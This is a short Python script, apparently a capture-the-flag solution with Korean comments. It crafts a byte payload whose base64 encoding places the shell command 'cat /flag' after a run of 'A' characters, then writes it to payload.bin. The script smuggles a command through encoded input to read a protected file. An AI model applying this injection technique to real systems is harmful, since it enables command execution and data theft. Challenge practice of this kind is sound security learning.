import base64

alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

desired = b"cat /flag"
desired_b64 = base64.b64encode(desired)  # b'Y2F0IC9mbGFn'

# 앞부분 패딩 'A' 65개로 수정
padding_len = 65  # 출력 기준
padding_bytes = (padding_len // 4) * 3
raw_padding = b"\x00" * padding_bytes  # 'A'가 Base64로 0x00

# Base64 역산
def decode_block(blocks):
    raw = bytearray()
    for i in range(0, len(blocks), 4):
        blk = blocks[i:i+4]
        idxs = [alphabet.index(c) for c in blk]
        v = (idxs[0]<<18) | (idxs[1]<<12) | (idxs[2]<<6) | idxs[3]
        raw += bytes([(v>>16)&0xff, (v>>8)&0xff, v&0xff])
    return raw

raw_desired = decode_block(desired_b64)

payload = raw_padding + raw_desired

# 확인
print("Base64 check:", base64.b64encode(payload))
with open("payload.bin", "wb") as f:
    f.write(payload)
